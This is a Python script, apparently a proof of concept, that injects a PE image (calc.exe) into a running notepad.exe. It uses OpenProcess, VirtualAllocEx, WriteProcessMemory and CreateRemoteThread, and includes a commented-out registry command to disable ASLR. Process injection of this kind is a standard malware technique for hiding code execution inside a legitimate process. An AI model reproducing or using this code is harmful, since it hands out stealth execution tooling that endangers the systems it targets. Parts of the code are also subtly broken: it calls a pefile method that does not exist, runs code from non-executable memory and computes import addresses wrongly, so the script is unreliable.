import psutil
import subprocess
import pefile
import struct
from ctypes import *
import ctypes

# Disable ASLR
# subprocess.run(["REG", "ADD", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management",
#                "/v", "MoveImages", "/t", "REG_DWORD", "/d", "0", "/f"], shell=True)

# Define the path to the PE file to inject
pe_file_path = "C:\Windows\System32\calc.exe"
# pe_file_path = "C:\Program Files\Google\Chrome\Application\chrome.exe"

# Find the process to inject the PE file into
process_name = "notepad.exe"
for proc in psutil.process_iter():
    if proc.name() == process_name:
        target_process = proc
        break
else:
    # If the process is not running, create a new instance
    target_process = subprocess.Popen(process_name)

# Open the PE file and read its contents
pe_file = pefile.PE(pe_file_path)
pe_data = open(pe_file_path, "rb").read()

# Calculate the size of the image
image_size = pe_file.OPTIONAL_HEADER.SizeOfImage

# Allocate memory in the target process to store the image
process_handle = windll.kernel32.OpenProcess(
    0x1F0FFF, False, target_process.pid)
image_base_address = windll.kernel32.VirtualAllocEx(
    process_handle, None, image_size, 0x3000, 0x04)

# Write the image to the allocated memory
windll.kernel32.WriteProcessMemory(
    process_handle, image_base_address, pe_data, len(pe_data), None)

# Calculate the base address of the image in the target process
pe_image_base_address = pe_file.OPTIONAL_HEADER.ImageBase

# Relocate the image to the allocated base address
delta = image_base_address - pe_image_base_address
pe_file.adjust_image_base(delta)

# Update the import table with the correct addresses
for entry in pe_file.DIRECTORY_ENTRY_IMPORT:
    dll_name = entry.dll.decode("utf-8")
    dll_handle = windll.kernel32.GetModuleHandleA(dll_name)

    for imp in entry.imports:
        function_name = imp.name.decode("utf-8")
        function_address = windll.kernel32.GetProcAddress(
            dll_handle, function_name)
        imp.address = image_base_address + function_address - pe_image_base_address

# Write the modified image to the allocated memory
windll.kernel32.WriteProcessMemory(
    process_handle, image_base_address, pe_file.get_memory_mapped_image(), image_size, None)

# Calculate the address of the entry point in the loaded module
entry_point_address = image_base_address + \
    pe_file.OPTIONAL_HEADER.AddressOfEntryPoint

# Create a remote thread in the target process to execute the entry point
windll.kernel32.CreateRemoteThread(
    process_handle, None, 0, entry_point_address, None, 0, None)
